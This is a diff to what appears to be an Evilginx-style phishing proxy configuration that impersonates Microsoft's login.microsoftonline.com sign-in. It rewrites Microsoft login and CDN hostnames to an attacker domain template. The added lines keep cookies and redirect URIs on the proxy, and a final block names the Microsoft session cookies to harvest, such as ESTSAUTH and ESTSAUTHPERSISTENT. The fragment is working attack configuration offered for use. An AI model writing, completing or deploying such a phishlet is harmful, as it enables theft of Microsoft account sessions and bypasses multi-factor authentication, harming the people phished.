@@ -9,6 +9,11 @@ sub_filters:
   - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'logincdn.msauth.net', replace: 'logincdn.{{.Endpoint2}}.{{.Domain}}', mimes: ['text/html', 'text/javascript', 'application/json']}
   - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'aadcdn.msftauth.net', replace: 'aadcdn.{{.Endpoint2}}.{{.Domain}}', mimes: ['text/html', 'text/javascript', 'application/json']}
   - {triggers_on: 'logincdn.msauth.net', orig_sub: 'logincdn', domain: 'msauth.net', search: 'login.microsoftonline.com', replace: '{{.Endpoint2}}.{{.Domain}}', mimes: ['text/html', 'text/javascript']}
+
+  # Cookie and Security Header Handling
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: '.login.microsoftonline.com', replace: '.{{.Domain}}', mimes: [], headers: ['Set-Cookie', 'Cookie']}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'ESTSAUTH', replace: 'ESTSAUTH', mimes: [], headers: ['Set-Cookie']}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'redirect_uri=https://login.microsoftonline.com', replace: 'redirect_uri=https://{{.Endpoint2}}.{{.Domain}}', mimes: [], headers: ['Location']}
 auth_tokens:
   - domain: '.login.microsoftonline.com'
     keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'ESTSAUTH_LIGHT', 'ESTSSC', 'ESTSAUTHLIGHT', 'SignInStateCookie']
